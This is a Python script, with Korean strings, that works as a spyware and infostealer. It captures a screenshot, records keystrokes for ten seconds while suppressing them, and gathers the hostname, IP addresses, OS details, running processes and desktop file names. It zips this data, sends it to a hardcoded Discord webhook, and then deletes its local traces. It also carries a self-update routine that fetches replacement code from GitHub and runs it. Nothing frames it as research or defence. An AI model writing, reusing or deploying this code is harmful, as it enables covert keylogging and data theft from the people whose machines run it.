import requests
import socket
import platform
import subprocess
import sys
import getpass
import os
import shutil
import psutil
import json
import keyboard
import pyautogui
import zipfile
import io
import threading
import time
import shutil
from datetime import datetime

GITHUB_RAW_PY_URL = "https://raw.githubusercontent.com/사용자명/저장소명/브랜치명/main.py"
GITHUB_VERSION_URL = "https://raw.githubusercontent.com/사용자명/저장소명/브랜치명/version.txt"
WEBHOOK_URL = "https://discord.com/api/webhooks/1399905739123851264/KGo056KSV0vHkieVqcHqxr7ZqWPjvlQE6QyOGDo03B9tMAJp1AVemdwlTOtJAKa7vb5r"

LOCAL_VERSION_FILE = "version.txt"
LOCAL_MAIN_FILE = "정보.py"

def get_online_version():
    return requests.get(GITHUB_VERSION_URL).text.strip()

def get_local_version():
    if not os.path.exists(LOCAL_VERSION_FILE):
        return None
    with open(LOCAL_VERSION_FILE) as f:
        return f.read().strip()

def update_main_file():
    r = requests.get(GITHUB_RAW_PY_URL)
    with open(LOCAL_MAIN_FILE, "w", encoding="utf-8") as f:
        f.write(r.text)
    print("[+] 코드가 업데이트 되었습니다.")

def save_version(ver):
    with open(LOCAL_VERSION_FILE, "w") as f:
        f.write(ver)

def restart_program():
    print("[+] 프로그램을 다시 시작합니다.")
    
    if getattr(sys, 'frozen', False):
        exe_path = sys.executable
        subprocess.Popen([exe_path])
    else:
        subprocess.Popen(["python", LOCAL_MAIN_FILE])
    
    sys.exit()

keystrokes = []
stop_keylogging = False

def get_system_info():
    info = {}
    info['hostname'] = socket.gethostname()
    info['ip_address'] = socket.gethostbyname(socket.gethostname())
    try:
        info['public_ip'] = requests.get('https://api.ipify.org').text
    except:
        info['public_ip'] = "가져오기 실패"
    info['os'] = f"{platform.system()} {platform.release()} {platform.version()}"
    info['architecture'] = platform.machine()
    info['processor'] = platform.processor()
    info['username'] = getpass.getuser()
    info['cpu_count'] = psutil.cpu_count()
    info['cpu_usage'] = psutil.cpu_percent(interval=1)
    memory = psutil.virtual_memory()
    info['total_memory'] = f"{memory.total / (1024**3):.2f} GB"
    info['used_memory'] = f"{memory.used / (1024**3):.2f} GB"
    disk = psutil.disk_usage('/')
    info['total_disk'] = f"{disk.total / (1024**3):.2f} GB"
    info['used_disk'] = f"{disk.used / (1024**3):.2f} GB"
    net_interfaces = psutil.net_if_addrs()
    info['network_interfaces'] = {iface: [addr.address for addr in addrs] for iface, addrs in net_interfaces.items()}
    processes = []
    for proc in psutil.process_iter(['name', 'pid']):
        try:
            processes.append(f"{proc.info['name']} (PID: {proc.info['pid']})")
        except:
            continue
    info['running_processes'] = processes[:5]
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    try:
        info['desktop_files'] = os.listdir(desktop_path)[:10]
    except:
        info['desktop_files'] = ["오류"]
    return info

def take_screenshot():
    try:
        screenshot = pyautogui.screenshot()
        screenshot_path = "screenshot.png"
        screenshot.save(screenshot_path)
        return screenshot_path
    except:
        return None

def keylogger():
    try:
        global keystrokes, stop_keylogging
        while not stop_keylogging:
            event = keyboard.read_event(suppress=True)
            if event.event_type == keyboard.KEY_DOWN:
                keystrokes.append(event.name)
            time.sleep(0.1)
    except:
        keystrokes.append("키로깅 중단")

def save_to_txt(system_info):
    try:
        with open('info.txt', 'w', encoding='utf-8') as f:
            f.write("====== 시스템 정보 ======\n")
            f.write(f"수집 시간: {datetime.now().strftime('%Y-%m-%d %H:%M')}\n\n")
            f.write("--- 네트워크 정보 ---\n")
            f.write(f"사설 IP: {system_info.get('ip_address', '없음')}\n")
            f.write(f"공인 IP: {system_info.get('public_ip', '없음')}\n")
            f.write(f"네트워크 인터페이스:\n{json.dumps(system_info.get('network_interfaces', {}), indent=2, ensure_ascii=False)}\n\n")
            f.write("--- 시스템 정보 ---\n")
            f.write(f"호스트 이름: {system_info.get('hostname', '없음')}\n")
            f.write(f"운영체제: {system_info.get('os', '없음')}\n")
            f.write(f"아키텍처: {system_info.get('architecture', '없음')}\n")
            f.write(f"프로세서: {system_info.get('processor', '없음')}\n")
            f.write(f"사용자 이름: {system_info.get('username', '없음')}\n")
            f.write(f"CPU 코어 수: {system_info.get('cpu_count', '없음')}\n")
            f.write(f"CPU 사용량: {system_info.get('cpu_usage', '없음')}%\n")
            f.write(f"총 메모리: {system_info.get('total_memory', '없음')}\n")
            f.write(f"사용 중인 메모리: {system_info.get('used_memory', '없음')}\n")
            f.write(f"총 디스크: {system_info.get('total_disk', '없음')}\n")
            f.write(f"사용 중인 디스크: {system_info.get('used_disk', '없음')}\n")
            f.write(f"실행 중인 프로세스:\n{json.dumps(system_info.get('running_processes', []), indent=2, ensure_ascii=False)}\n")
            f.write(f"바탕화면 파일:\n{json.dumps(system_info.get('desktop_files', []), indent=2, ensure_ascii=False)}\n\n")
            f.write("--- 키 입력 기록 (10초) ---\n")
            f.write('\n'.join(keystrokes) or "입력 기록 없음\n")
        return ['info.txt']
    except:
        return []

def create_zip(txt_files, screenshot_path):
    try:
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            for txt_file in txt_files:
                if os.path.exists(txt_file):
                    zip_file.write(txt_file, os.path.basename(txt_file))
            if screenshot_path and os.path.exists(screenshot_path):
                zip_file.write(screenshot_path, 'screenshot.png')
        zip_buffer.seek(0)
        zip_path = 'data.zip'
        with open(zip_path, 'wb') as f:
            f.write(zip_buffer.getvalue())
        return zip_path
    except:
        return None

def send_to_webhook(zip_path):
    try:
        if zip_path and os.path.exists(zip_path):
            with open(zip_path, 'rb') as f:
                public_ip = socket.gethostbyname(socket.gethostname())
                try:
                    public_ip = requests.get('https://api.ipify.org').text
                except:
                    public_ip = "알 수 없음"
                payload = {
                    "embeds": [{
                        "title": "데이터 수집 로그",
                        "fields": [
                            {"name": "수집 시간", "value": datetime.now().strftime('%Y-%m-%d %H:%M'), "inline": True},
                            {"name": "공인 IP", "value": public_ip, "inline": True},
                            {"name": "상태", "value": "성공", "inline": True}
                        ],
                        "color": 65280 
                    }],
                    "attachments": [{"filename": "data.zip", "id": "0"}]
                }
                files = {'file': ('data.zip', f)}
                response = requests.post(WEBHOOK_URL, files=files, json=payload)
                return response.status_code == 200 or response.status_code == 204
    except:
        payload = {
            "embeds": [{
                "title": "데이터 수집 로그",
                "fields": [
                    {"name": "수집 시간", "value": datetime.now().strftime('%Y-%m-%d %H:%M'), "inline": True},
                    {"name": "공인 IP", "value": "알 수 없음", "inline": True},
                    {"name": "상태", "value": "실패", "inline": True}
                ],
                "color": 16711680  
            }]
        }
        requests.post(WEBHOOK_URL, json=payload)
        return False

def main():
    try:
        online_version = get_online_version()
        local_version = get_local_version()

        if online_version != local_version:
            print(f"[!] 새로운 버전이 있습니다: {online_version}")
            choice = input("업데이트 하시겠습니까? (Y/N): ").strip().lower()
            if choice == 'y':
                update_main_file()
                save_version(online_version)
                restart_program()
            else:
                print("업데이트를 건너뜁니다.")
        else:
            print("최신 버전입니다.")
    except:
        print("버전 체크 중 오류가 발생했습니다. 프로그램을 계속 실행합니다.")

    global stop_keylogging
    screenshot_path = take_screenshot()  
    keylog_thread = threading.Thread(target=keylogger)
    keylog_thread.start()
    
    time.sleep(10)
    stop_keylogging = True
    keylog_thread.join()
    
    system_info = get_system_info()
    txt_files = save_to_txt(system_info)
    
    zip_path = create_zip(txt_files, screenshot_path)
    
    send_to_webhook(zip_path)
    
    for file in [screenshot_path, zip_path] + txt_files:
        if file and os.path.exists(file):
            try:
                os.remove(file)
            except:
                pass

if platform.system() == "Emscripten":
    import asyncio
    asyncio.ensure_future(main())
else:
    if __name__ == "__main__":
        main()  
